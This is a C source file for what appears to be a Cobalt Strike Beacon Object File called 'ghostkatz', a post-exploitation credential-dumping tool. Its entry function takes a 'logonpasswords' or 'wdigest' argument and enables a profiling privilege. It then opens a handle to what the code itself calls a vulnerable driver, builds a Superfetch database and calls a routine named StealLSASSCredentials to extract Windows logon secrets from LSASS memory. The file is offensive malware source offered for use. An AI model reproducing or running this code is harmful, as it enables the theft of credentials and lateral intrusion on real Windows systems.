#include "beacon.h"
#include "defs.h"
#include "ioctl.h"
#include "ghostkatz.h"


#include "utils.c"
#include "privileges.c"
#include "superfetch.c"
#include "lsass.c"
#include "eprocess.c"


int go(char *args, int argLen)
{
    datap parser;
	BeaconDataParse(&parser, args, argLen);
    char* argument = BeaconDataExtract(&parser, NULL);

    if (argument == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "No argument was passed!");
        return FALSE;
    }

    if ( (strcmp(argument, "logonpasswords") != 0) && (strcmp(argument, "wdigest") != 0) )
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid argument!");
        return FALSE;
    }


    BOOL bResult = EnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE);
    if (!bResult) 
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable privilege! Error code: %llx", GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE");


    isServiceInstalled();


    HANDLE hFile = CreateFileW(TPWSAV_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) 
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not open handle to driver : %llx", GetLastError());
        return FALSE;
    }
    else 
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Got handle to device : %ls", TPWSAV_DEVICE_NAME);
    }


    char* WindowsBuild = GetWinBuildNumber();
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Windows Build Number: %s", WindowsBuild);


    CreateGlobalSuperfetchDatabase();


    StealLSASSCredentials(hFile, WindowsBuild);


    BeaconPrintf(CALLBACK_OUTPUT, "[+] Closing handle to vulnerable driver");
    CloseHandle(hFile);
    
}
